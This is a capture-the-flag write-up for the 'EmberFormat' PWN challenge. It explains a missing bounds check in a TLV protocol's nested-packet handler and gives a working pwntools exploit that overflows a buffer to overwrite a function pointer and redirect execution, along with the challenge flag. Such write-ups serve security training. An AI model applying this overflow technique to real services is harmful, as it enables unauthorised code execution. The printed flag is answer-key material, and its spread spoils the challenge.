# EmberFormat

**Category:** PWN  
**Challenge Description:**

A binary protocol service with a strict format. Send the right packets — but watch out, the format has teeth.

Flag: `KOS{F1EF1A1FA56240A4BEA77DA7775D2C51}`

## Analysis

TLV-based binary protocol with a proof-of-work gate. Four decoy `KOS{}` flags are hardcoded as diagnostic strings (`STRUCT_CANARY_BYPASS_CONFIRMED`, `HEARTBLEED_BUFFER_LEAK`, `DOUBLE_FREE_ROOT_SHELL`, `98B43687...`). The real flag is read from `/flag` by `print_flag()` at `0x401287`.

The vulnerability: the NESTED packet handler (type `0x0003`) reads a 6-byte inner header `[inner_type: u16][inner_count: u32]`, then calls `read_exact(g_conn, inner_count)` with **no bounds check**. Setting `inner_count=0x108` writes 256 bytes of padding + a function pointer past the `g_conn` data area, overwriting the handler at `g_conn+0x100`. A RUN packet (type `0x0004`) then calls the overwritten handler.

## Solution

1. Solve PoW: brute-force `sha256(session + nonce)` until the first 3 bytes are `\x00\x00\x00`.
2. Send a NESTED packet with `inner_count=0x108` followed by `0x100` bytes padding + `p64(print_flag)`.
3. Send a RUN packet to trigger `print_flag()`.

```python
#!/usr/bin/env python3
from pwn import *
import hashlib, struct

HOST, PORT = 'ctf.kosovacyber.team', 2103
PRINT_FLAG  = 0x401287

def solve_pow(session):
    prefix = session.encode()
    i = 0
    while True:
        h = hashlib.sha256(prefix + str(i).encode()).digest()
        if h[0] == h[1] == h[2] == 0:
            return str(i)
        i += 1

r = remote(HOST, PORT)
r.recvuntil(b'session=')
session = r.recvline().decode().strip()
r.recvuntil(b'[pow] send hex nonce terminated by newline: ')
r.sendline(solve_pow(session).encode())
r.recvline()

inner = struct.pack('>HI', 0x0000, 0x108)
outer = struct.pack('>HH', 0x0003, 0x0006) + inner
r.send(outer)
r.send(b'A' * 0x100 + p64(PRINT_FLAG))
r.recvline()

r.send(struct.pack('>HH', 0x0004, 0x0000))
print(r.recvall(timeout=5))
```
